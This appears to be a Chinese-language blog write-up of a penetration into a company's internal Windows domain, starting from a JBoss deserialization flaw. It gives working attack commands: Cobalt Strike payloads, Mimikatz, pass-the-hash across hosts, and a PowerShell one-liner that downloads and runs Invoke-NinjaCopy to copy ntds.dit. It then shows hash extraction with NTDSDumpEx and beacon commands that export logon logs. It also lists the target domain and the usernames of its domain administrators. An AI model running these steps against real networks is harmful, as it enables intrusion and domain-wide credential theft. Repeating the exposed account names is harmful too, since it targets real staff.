---
title: 【域渗透】JBoss引起的内网渗透
date: 2019-05-26 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。
---
# 切入点

Jboss的反序列化漏洞，获取到shell，就不多说了，远程部署war。

# 信息收集

```
whoami  --> windows-7p8piq7\administrator
ipconfig --> 192.168.58.231
tasklist --> 360EntClient.exe \ZhuDongFangYu.exe .. (360全家桶)
systeminfo --> Windows Server 2008 R2 Enterprise
```

# 横向拓展

## 前奏

用`CS`生成`powershell`的`exp`就过了。到目标机`cmd`下执行弹回。由于权限较高，

直接`run Mimikatz` 获取到了当前主机用户的ntlm hash。

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag1.png)

## 方法

使用`Cobalt Strike`的ARP扫描（因为net view使用不了），使得`Targets`有记录
。
![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag2.png)

用比较典型的`hash传递`碰一下看看运气怎么样。

登陆情况如下：

```
192.168.58.1 # 成功
192.168.58.18 # 成功
....
192.168.58.3 # 失败
192.168.58.7 # 失败
....
192.168.58.68 # 成功
192.168.58.21 # 成功
```

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag3.png)

这个过程就是不断的进行`hash注入`，不断的`dump密码`，结果就如上图。看`Credentials`里是否存在域管用户账密。
![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag4.png)

## 定位

```
从58.18的机子上发现存在域： 

所属域 -->MERCURY.COM  近1400个域用户...

nltest /dclist:MERCURY.COM #查看域控 （2个)

pdc.mercury.com [PDC]  --> 主dc --> 192.168.58.2
BDC.mercury.com        --> 备dc --> 192.168.58.1
-----------------------------------------------------------------------------

net group "domain admins" /domain  #查看域管理员 （9个)
-----------------------------------------------------------------------------
Administrator            chenfeng                 chudonggen               
dongzhiwei               IT                       lifen                    
qiaopeng                 weiwei                   zhangxuejun 

net group "domain controllers" /domain  #查看域控制器
-----------------------------------------------------------------------------
BDC$                     PDC$
```

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag5.png)


然而发现我已经获取到了dc的账号密码。并在`CS`上上线了，这就意味的此时的域已经沦陷。

## 问题

- vssadmin 无法提取出ntds.dit、在系统中卡死
- ntdsutil 被破坏、无法运行

## 突破方法：

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\Users\dongzhiwei\Desktop\ntds.dit"
```

这里用powerSploit框架中的Invoke-NinjaCopy,远程复制文件，成功提取到ntds.dit / system.hive

## 提取

参考链接：https://github.com/zcgonvh/NTDSDumpEx

```
ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv
```

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag6.png)

之前给自己挖了个坑，关于如何去获取域用户的登录IP，除了nmap外，可以ping域用户名，然而这是一个非常错误的认知，这种前提是UNC为系统机器名，这种情况少之又少。

参考klion牛的方法：

从目标主控中导出成功登录日志,来定位指定目标机器

```
beacon> shell hostname
beacon> shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:"*[EventData[Data[@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) <= 4449183132]]]"
beacon> shell tasklist | findstr "wevtutil.exe"
beacon> shell dir c:\windows\logs\risalogs.evtx
beacon> download c:\windows\logs\risalogs.evtx
beacon> downloads
```

利用 `Log Parser` 日志分析工具,从log中匹配：

```
LogParser.exe -i:EVT -o csv "SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,'|')) as IP FROM c:\risalogs.evtx" > C:\log.txt

进行去重、替换：

grep -v '\$' log.txt | sort | uniq | egrep -v 'ANONYMOUS LOGON|-|:' > login_succeed.txt
```

![img](https://c1y2m3.oss-cn-beijing.aliyuncs.com/dag7.png)

# 收尾

 从内网中获取了大量主机权限，VPN、核心代码，数据库等，逐进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。
